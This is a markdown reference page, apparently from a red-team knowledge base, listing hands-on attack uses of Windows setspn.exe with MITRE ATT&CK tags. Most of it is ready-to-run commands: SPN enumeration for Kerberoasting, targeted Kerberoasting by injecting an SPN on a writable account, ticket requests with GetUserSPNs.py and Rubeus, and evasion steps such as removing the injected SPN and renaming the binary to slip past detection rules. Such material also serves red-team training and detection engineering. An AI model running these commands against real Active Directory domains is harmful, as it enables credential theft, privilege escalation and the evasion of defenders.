# LOLBins — setspn.exe — Hands-On Use Cases

Full commands for every scenario named in `01 - Overview.md`'s Quick Use-Case List, each tagged with its MITRE ATT&CK technique(s). Reminder from that file: **every write use case (`-S`/`-A`/`-D`/`-R`) depends on AD permissions `setspn.exe` never checks or supplies itself** — a failed write here means the operator lacks the underlying ACE, not a `setspn.exe` limitation.

## Contents
- [Single-Account SPN Enumeration](#single-account-spn-enumeration)
- [Domain-Wide SPN Enumeration](#domain-wide-spn-enumeration)
- [Forest-Wide SPN Enumeration via the Global Catalog](#forest-wide-spn-enumeration-via-the-global-catalog)
- [Cross-Domain Duplicate-SPN Discovery](#cross-domain-duplicate-spn-discovery)
- [Targeted Kerberoasting — SPN Injection](#targeted-kerberoasting--spn-injection)
- [Cleanup After Targeted Kerberoasting](#cleanup-after-targeted-kerberoasting)
- [Pre-Attack Triage of Delegation-Adjacent Accounts](#pre-attack-triage-of-delegation-adjacent-accounts)
- [Chained After a BloodHound GenericWrite Result](#chained-after-a-bloodhound-genericwrite-result)
- [Chained Before GetUserSPNs.py or Rubeus](#chained-before-getuserspnspy-or-rubeus)
- [Low-Noise Legitimate-Cover Recon](#low-noise-legitimate-cover-recon)
- [Fleet/Forest Sweep for Stale SPNs](#fleetforest-sweep-for-stale-spns)
- [Renamed or Relocated Binary](#renamed-or-relocated-binary)

---

## Single-Account SPN Enumeration

A direct object read, not a search — the fastest way to check one already-known account's current SPN set, e.g. after identifying a candidate service account from an earlier BloodHound or LDAP pass.

```
setspn -L svc-sql01
```

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) (Account Discovery: Domain Account).

## Domain-Wide SPN Enumeration

The standard "roast everything" recon pass, entirely native — no Python, no third-party package, nothing beyond a domain-joined or AD-DS-tooled Windows host. Functionally the same LDAP leg as `GetUserSPNs.py`'s enumeration step (see [`Impacket/GetUserSPNs (Kerberoasting)/01 - Overview.md`](<../../Impacket/GetUserSPNs (Kerberoasting)/01 - Overview.md>)):

```
setspn -Q */*
```

Or explicitly scoped to a named domain:

```
setspn -T contoso.local -Q */*
```

This only **lists** SPN-bearing accounts — it requests no Kerberos ticket and produces no crackable hash on its own. A separate tool (see [Chained Before GetUserSPNs.py or Rubeus](#chained-before-getuserspnspy-or-rubeus) below) is required to turn the resulting account list into an actual roast.

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (SPN-enumeration leg) + [T1087.002](https://attack.mitre.org/techniques/T1087/002/).

## Forest-Wide SPN Enumeration via the Global Catalog

Reaches every domain in a multi-domain forest in a single query, over the Global Catalog (TCP 3268) rather than one DC's domain-scoped LDAP — useful once a foothold exists anywhere in the forest and the operator wants a forest-wide target list without enumerating each domain individually.

```
setspn -T contoso.local -F -Q */*
```

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) + [T1087.002](https://attack.mitre.org/techniques/T1087/002/).

## Cross-Domain Duplicate-SPN Discovery

`-X` doubles as legitimate SPN-hygiene troubleshooting and attacker recon — duplicate SPNs are a real, commonly-encountered admin headache, so this command line reads as routine even when run by an attacker mapping the environment:

```
setspn -T contoso.local -T fabrikam.local -X
```

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/).

## Targeted Kerberoasting — SPN Injection

The write-primitive use case from `01 - Overview.md`'s red-flag callout. Requires the operator already hold `GenericWrite`/`GenericAll`/`WriteProperty(servicePrincipalName)`/Validated-SPN rights over the specific target account — typically identified via a BloodHound ACL-abuse path (see [Chained After a BloodHound GenericWrite Result](#chained-after-a-bloodhound-genericwrite-result) below) against an account that does **not** already carry an SPN (and so would never appear in a standard `-Q */*`/`GetUserSPNs.py` sweep):

```
REM 1. Confirm the target currently has no SPN (i.e. it's not already roastable the normal way)
setspn -L targetuser

REM 2. Inject a throwaway SPN — the string itself is arbitrary, it only needs to be unique domain-wide
setspn -S http/fakesvc.corp.local targetuser

REM 3. Request a TGS for the newly-added SPN with a separate tool (setspn.exe never does this itself)
GetUserSPNs.py -request-user targetuser CONTOSO/lowpriv:'P@ssw0rd!'@dc01.contoso.local
REM — or, from Windows: Rubeus.exe kerberoast /user:targetuser /nowrap
```

The recovered `$krb5tgs$...` hash is now crackable exactly like a standard Kerberoast catch — see [`Hashcat/02 - Hands-On Use Cases.md`](<../../Hashcat/02 - Hands-On Use Cases.md>)'s Kerberoasting-hash section, not re-derived here.

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Kerberoasting, targeted variant) + [T1078.002](https://attack.mitre.org/techniques/T1078/002/) (the underlying valid-account/ACE abuse that makes the write possible).

## Cleanup After Targeted Kerberoasting

A careful operator removes the injected SPN immediately after the TGS-REQ completes, minimizing the window during which the account looks roastable to anyone else enumerating the domain — and restoring the account to its pre-attack, non-SPN-bearing state before an analyst's next `-Q */*` sweep would catch it:

```
setspn -D http/fakesvc.corp.local targetuser
```

**MITRE ATT&CK:** [T1070 — Indicator Removal](https://attack.mitre.org/techniques/T1070/), layered on top of the T1558.003 injection above.

## Pre-Attack Triage of Delegation-Adjacent Accounts

Reading SPNs alongside a broader enumeration pass to prioritize which SPN-bearing accounts are also high-value — an `MSSQLSvc/`, `HTTP/`, or `HOST/` SPN naming a Tier-0-adjacent host is a materially better roasting target than an SPN on an isolated line-of-business server:

```
setspn -Q */*
REM cross-reference the returned account list against BloodHound's admin-fan-out ranking —
REM see BloodHound/BloodHound/02 - Hands-On Use Cases.md's "Kerberoastable users with most
REM admin privileges" prebuilt query, which performs exactly this triage
```

**MITRE ATT&CK:** [T1087.002](https://attack.mitre.org/techniques/T1087/002/) + [T1069.002 — Permission Groups Discovery: Domain Groups](https://attack.mitre.org/techniques/T1069/002/) (the admin-fan-out ranking step).

## Chained After a BloodHound GenericWrite Result

BloodHound identifies *which* account is writable; `setspn -S` is the concrete exploitation step. A realistic chain, cross-linked rather than re-derived from [`BloodHound/BloodHound/02 - Hands-On Use Cases.md`](<../../BloodHound/BloodHound/02 - Hands-On Use Cases.md>):

```
REM 1. In the BloodHound UI / Cypher tab: find a GenericWrite/GenericAll path from an
REM    already-owned principal to some user object (see BloodHound's own GenericWrite query)

REM 2. Confirm that user has no existing SPN (otherwise it's already roastable the normal way,
REM    and injecting one is unnecessary noise)
setspn -L bh_identified_target

REM 3. Inject, roast, clean up — the three-command sequence from Targeted Kerberoasting above
setspn -S http/fakesvc.corp.local bh_identified_target
GetUserSPNs.py -request-user bh_identified_target CONTOSO/lowpriv:'P@ssw0rd!'@dc01.contoso.local
setspn -D http/fakesvc.corp.local bh_identified_target
```

**MITRE ATT&CK:** [T1482 — Domain Trust Discovery](https://attack.mitre.org/techniques/T1482/)/[T1069.002](https://attack.mitre.org/techniques/T1069/002/) (BloodHound's own recon step) → [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (the injection + roast).

## Chained Before GetUserSPNs.py or Rubeus

`setspn.exe` as the recon front-end for a dedicated Kerberoasting tool — useful when an operator wants to do enumeration from a native, less-fingerprinted binary and only bring in Impacket or Rubeus for the actual ticket request:

```
REM Native recon — no Python interpreter, no Impacket install footprint on this host
setspn -Q */* > spn_targets.txt

REM Hand the resulting account list to a dedicated roasting tool for the TGS-REQ/crack step
GetUserSPNs.py CONTOSO/lowpriv:'P@ssw0rd!'@dc01.contoso.local -request
```

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) across both steps.

## Low-Noise Legitimate-Cover Recon

An operator deliberately staying on read-only switches (`-L`/`-Q`/`-X`) produces a command line that reads as routine AD service-account administration — no unusual process name, no third-party package import, nothing that stands out the way `GetUserSPNs.py`'s own process signature would on a host where Python/Impacket presence is itself unusual:

```
setspn -Q */*
```

Identical to the domain-wide enumeration use case above — listed separately here because the *intent* (blending into normal admin activity rather than maximizing enumeration speed) is the operationally distinct choice, not the syntax.

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) + [T1036 — Masquerading](https://attack.mitre.org/techniques/T1036/) (blending with expected admin tooling, in intent if not in binary identity).

## Fleet/Forest Sweep for Stale SPNs

Genuine hygiene task and recon dual-use — identifying SPNs still registered against decommissioned or renamed hosts fingerprints retired infrastructure while looking like routine cleanup work:

```
setspn -T contoso.local -F -Q HOST/*
REM cross-reference the returned host list against current DNS/AD computer-object inventory
REM to flag SPNs naming hosts that no longer resolve or no longer have a live computer object
```

**MITRE ATT&CK:** [T1018 — Remote System Discovery](https://attack.mitre.org/techniques/T1018/).

## Renamed or Relocated Binary

Copying `setspn.exe` under a different name/path to dodge simple image-name-keyed detection rules — the binary itself is unmodified and Authenticode-signed regardless of what it's called, so signature- or hash-based rules survive this even though `Image=`/`OriginalFileName`-agnostic ones don't. Because `setspn.exe` also isn't present by default on non-DC hosts (see `01 - Overview.md`'s Prerequisites), a copied instance on a workstation is itself a notable artifact independent of its filename:

```
copy C:\Windows\System32\setspn.exe C:\Users\Public\spnutil64.exe
C:\Users\Public\spnutil64.exe -Q */*
```

**MITRE ATT&CK:** [T1036.003 — Masquerading: Rename System Utilities](https://attack.mitre.org/techniques/T1036/003/), layered on top of whichever `setspn.exe` use case above it's paired with.
